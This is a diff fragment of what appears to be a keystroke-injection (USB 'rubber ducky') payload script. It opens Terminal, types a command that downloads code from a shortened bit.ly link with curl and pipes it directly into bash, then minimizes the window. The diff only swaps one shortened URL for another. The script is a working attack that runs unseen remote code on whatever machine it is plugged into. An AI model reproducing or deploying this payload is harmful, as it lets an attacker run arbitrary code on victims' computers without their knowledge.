@@ -3,6 +3,6 @@ DELAY 200
 STRING Terminal
 ENTER
 DELAY 500
-STRING curl -L http://bit.ly/2t6ZFlq | bash
+STRING curl -L https://bit.ly/2USrvQ4 | bash
 ENTER
 GUI m
